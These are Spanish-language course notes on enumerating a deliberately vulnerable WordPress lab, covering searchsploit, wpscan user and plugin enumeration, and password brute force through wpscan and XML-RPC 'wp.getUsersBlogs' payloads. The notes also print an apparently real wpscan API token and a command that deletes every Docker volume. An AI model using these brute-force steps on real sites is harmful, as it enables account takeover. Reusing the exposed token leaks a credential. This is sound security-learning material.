## Enumeración de WordPress

**WordPress** es uno de los gestores de contenido (CMS) más famosos en la actualidad. A lo largo de este apartado se estudiará como enumerarlo.

En primer lugar, se procederá con la clonación del siguiente repositorio: [DVWP](https://github.com/vavkamil/dvwp). En este repositorio se encuentra el proyecto que se utilizará para enumerar WordPress.

Una vez clonado, se deberá ejecutar el siguiente comando de **docker-compose** para crear el contenedor:

	docker-compose up -d --build

**ADVERTENCIA**: Al ejecutar este comando, se crean unos volúmenes en Docker con toda la información del contenedor. Existen varios comandos para listar y eliminar estos volúmes:

***LISTAR VOLÚMENES***

	docker volume ls

***ELIMINAR VOLÚMENES***

	docker volume rm $(docker volume ls -q)

En caso de querer volver a usar el proyecto de WordPress en Docker desde 0, será necesario borrar estos dos volúmenes antes de volver a usarlo o crearlo. Pues, de lo contrario, aunque volvamos a clonar el repositorio y a crear el contenedor, se seguirá manteniendo toda la información almacenada de otras veces.

Una vez creado el usuario y demás (accediendo al panel de WordPress desde: "**localhost:31337**"), se deberá ejecutar el siguiente comando para que se instalen los plugins necesarios:

	docker-compose run --rm wp-cli install-wp

Si se quisieran "apagar" los contenedores creados, se debe usar el siguiente comando:

	docker-compose down

### SEARCHSPLOIT

A continuación se hace uso de la utilidad '**searchsploit**', la cual está sincronizada con la web **exploit-db**, en la que pueden encontrarse todo tipo de exploits.

	searchsploit wordpress user enumeration

- De esta forma se podría buscar en la base de datos exploits que permitan enumerar los usuarios relacionados con una página WordPress.

![searchsploit](https://github.com/danibetzamora/Hack4U/assets/72496191/a75341d1-3fd9-4da6-98d3-80290e2f78dd)

Con **searchsploit** se pueden examinar los archivos en los que se encuentran los exploits de la siguiente manera:

	searchsploit -x 41497.php

- El parámetro `-x` se usa para *examinar* un archivo.
- En este caso, el archivo se obtuvo después de aplicar la búsqueda para enumerar usuarios en WP.

### WPSCAN

Sin embargo, una de las herramientas que utilizamos en esta clase para enumerar este gestor de contenido es **Wpscan**. Wpscan es una herramienta de código abierto que se utiliza para escanear sitios web en busca de vulnerabilidades de seguridad en WordPress.

Con Wpscan, podemos realizar una enumeración completa del sitio web y obtener información detallada sobre la instalación de WordPress, como la versión utilizada, los plugins y temas instalados y los usuarios registrados en el sitio. También nos permite realizar pruebas de fuerza bruta para descubrir contraseñas débiles y vulnerabilidades conocidas en plugins y temas.

Se puede instalar con el siguiente comando:

	gem install wpscan

Y para usarlo, bastará con ejecutar la siguiente orden, indicando una URL de un sitio web hecho con WordPress:

	wpscan --url http//127.0.0.1:31337

Si se desea enumerar usuarios o plugins vulnerables en WordPress utilizando la herramienta wpscan, puedes añadir los siguientes parámetros a la línea de comandos:

	wpscan --url http//127.0.0.1:31337 --enumerate vp,u

En caso de querer enumerar más vulnerabilidades de los plugins, deberemos hacernos una cuenta en **wpscan** para obtener un *api token*. Una vez obtenido, se podrá ejecutar el siguiente comando:

	wpscan --url http://127.0.0.1:31337 -e vp --api-token="GJ6DtvnSQk63DjacadfATOnoGx41Ikf9utvZ702vdrY"

También, con esta herramienta puede hacerse uso de un diccionario para realizar un ataque de fuerza bruta, pudiendo obtener las credenciales de acceso:

	wpscan --url http://localhost:31337 -U dalnitak -P /usr/share/wordlists/rockyou.txt

### Escaneo de plugins manual

Existe una forma de enumerar los plugins de forma manual. En el siguiente directorio de **Wordpress** se deberían listar todos los plugins que están siendo usados en un directorio (Directory Listing): <http://localhost:31337/wp-content/plugins/>. 

Sin embargo, en el ejemplo práctico, esta ruta no mostraba nada a través del navegador. En caso de que ocurra esto, se podría obtener información de esta ruta haciendo una petición mediante el método **GET** del protocolo **HTTP** con el comando `curl`, de la siguiente manera:

	curl -s -X GET "http://localhost:31337/"

De esta forma, obtendremos el código fuente de esta ruta de **Wordpress**. En el código fuente, podremos ver varias rutas en las que se contempla la palabra *plugin*, por lo que filtrando con una expresión regular de la siguiente forma podremos obtener los plugins disponibles en el sitio web en concreto:

	curl -s -X GET "http://localhost:31337/" | grep -oP '/plugins/\K[^/]+' | sort -u

Por lo que esto es una forma alternativa de enumerar los plugins que están siendo usados en un sitio web que haga uso de Wordpress.

### XMLRPC

Asimismo, otro de los recursos que contemplamos en esta clase es el archivo **xmlrpc.php**. Este archivo es una característica de WordPress que permite la comunicación entre el sitio web y aplicaciones externas utilizando el protocolo **XML-RPC**.

El archivo xmlrpc.php es utilizado por muchos plugins y aplicaciones móviles de WordPress para interactuar con el sitio web y realizar diversas tareas, como publicar contenido, actualizar el sitio y obtener información.

Sin embargo, este archivo también puede ser abusado por atacantes malintencionados para aplicar **fuerza bruta** y descubrir **credenciales válidas** de los usuarios del sitio. Esto se debe a que xmlrpc.php permite a los atacantes realizar un número ilimitado de solicitudes de inicio de sesión sin ser bloqueados, lo que hace que la ejecución de un ataque de fuerza bruta sea relativamente sencilla.

Por lo que, antes que nada, será necesario ver si el archivo *xmlrpc.php* está expuesto o no. Simplemente se deberá buscar la siguiente URL: <http://localhost:31337/xmlrpc.php/>.

![xmlrpc](https://github.com/danibetzamora/Hack4U/assets/72496191/ec01bffa-b388-4fac-b6d7-c67cf0e2f4c9)

Como se puede observar en la imagen, el servidor solo acepta peticiones por **POST**. Por eso mismo, se deberá realizar una petición por POST de la siguiente manera:

	curl -s -X POST "http://localhost:31337/xmlrpc.php/"ç

Esto devolverá un error, ya que la petición por POST no está bien formada. Para que sea correcta, se deberá enviar una estructura bien formada de XML.

Para realizar una petición que contenga un archivo XML bien estructurado, podremos realizar una búsqueda simple en Google de la siguiente forma: "*abusing xmlrpc.php wordpress*". Tras realizar dicha búsqueda, se muestra un ejemplo de archivo XML:

```xml
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

Para comprobar que la petición por POST ahora funciona correctamente, se deberá ejecutar el siguiente comando:

	curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml

- El parámetro `-d@`, seguido del nombre del archivo, sirve para indicar el nombre del archivo que se incluirá en la petición que se va a realizar.

Sabiendo esto, podemos hacer uso de la siguiente estructura de XML, en la cual se puede introducir un nombre de usuario y una contraseña. Al realizar una petición por POST adjuntando este archivo, el servidor nos responderá o con un mensaje de error (usuario o contraseña incorrectos), o con una estructura XML que nos dice que el usuario y la contraseña son correctos, aparte de darnos más información. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>dalnitak</value></param> 
<param><value>louise</value></param> 
</params> 
</methodCall>
```

De esta manera, podría realizarse un script en bash que permita aplicar fuerza bruta, haciendo uso de esta estructura XML, para obtener las credenciales de administrador de un sitio web hecho con Wordpress. Dejo el enlace directo al script en cuestión: [Fuerza Bruta Wordpress - Bash Script](./Scripts/xmlrpc_bruteforce.sh).